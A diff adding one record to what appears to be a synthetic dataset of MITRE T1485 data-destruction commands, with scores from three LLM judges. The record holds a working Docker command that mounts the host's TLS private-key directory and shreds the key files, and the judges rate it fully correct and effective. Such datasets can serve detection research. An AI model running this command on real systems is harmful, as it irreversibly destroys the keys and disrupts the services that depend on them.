@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1485",
+  "platform": "Containers",
+  "shell": "Bash",
+  "command": "docker run --rm -v /etc/ssl/private:/target:rw debian bash -lc 'find /target -maxdepth 1 -type f -name \"*.key\" -print0 | xargs -0 -r shred -n 3 -z -u; sync'",
+  "explanation": "Bind-mounts a targeted host path used by containers for TLS keys and securely overwrites and deletes *.key files, followed by sync.",
+  "rationale_steps": [
+    "Bind-mount the exact TLS key directory to a helper container",
+    "Limit scope to top-level *.key files only",
+    "Use shred with multiple passes and zeroing, then unlink",
+    "Sync writes to disk"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-763669c5-0fb053b1",
+  "source_prompt_hash": "763669c5",
+  "timestamp_utc": "2025-09-30T08:01:03.936632Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid docker/run syntax, and correct find/xargs/shred options and separators.",
+        "semantic_score": 5,
+        "semantic_justification": "It bind-mounts the host’s TLS key directory and uses shred to overwrite and delete *.key files followed by sync, achieving data destruction as described (assuming docker access and a filesystem where shred is effective).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:17:23.769325Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper flag usage for docker run, find, xargs, and shred, and valid command separators including the semicolon before sync.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1485 by bind-mounting the host's TLS private key directory into a container with write access, then using shred with 3 overwrite passes plus a final zero-pass (-n 3 -z) and unlink (-u) to securely destroy all *.key files, followed by sync to flush writes to disk, which is operationally realistic and highly effective for irreversible key destruction.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T01:43:26.755799Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly formed, using valid Docker flags, proper shell quoting, and correct pipe syntax for find and xargs.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements the Data Destruction technique by bind-mounting a sensitive host directory into a container and using the shred utility to securely overwrite and delete files.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T01:43:32.795093Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
